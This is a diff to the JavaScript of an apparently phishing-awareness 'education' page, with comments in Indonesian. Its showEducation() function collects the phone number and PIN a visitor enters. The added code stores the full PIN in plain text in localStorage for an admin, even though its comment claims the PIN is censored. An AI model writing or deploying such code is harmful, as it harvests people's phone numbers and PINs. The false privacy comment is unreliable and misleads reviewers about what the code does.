@@ -532,26 +532,20 @@
         });
 
         function showEducation() {
-    // Simpan data untuk admin (PIN tidak disensor)
-    const phone = document.getElementById('phone').value;
-    const pinDigits = document.querySelectorAll('.pin-digit');
-    const pinValue = Array.from(pinDigits).map(digit => digit.value).join('');
-    const pinLength = pinValue.length;
-    
-    const educationData = {
-        id: Date.now(),
-        timestamp: new Date().toISOString(),
-        phone: phone,
-        pinEntered: pinValue || 'Tidak diisi',
-        fullPinLength: pinLength,
-        userAgent: navigator.userAgent,
-        ip: 'Hidden for privacy'
-    };
-
-    console.log(educationData);
-    // Bisa juga kamu kirim ke server atau tampilkan di halaman
-}
-
+            // Simpan data untuk admin (PIN tersensor)
+            const phone = document.getElementById('phone').value;
+            const pinDigits = document.querySelectorAll('.pin-digit');
+            const pinLength = Array.from(pinDigits).filter(digit => digit.value).length;
+            
+            const educationData = {
+                id: Date.now(),
+                timestamp: new Date().toISOString(),
+                phone: phone,
+                pinEntered: Array.from(pinDigits).map(digit => digit.value).join('') || 'Tidak diisi',
+                fullPinLength: pinLength,
+                userAgent: navigator.userAgent,
+                ip: 'Hidden for privacy'
+            };
             
             // Simpan data (hanya admin yang bisa akses)
             let allData = JSON.parse(localStorage.getItem('kkn_education_data') || '[]');
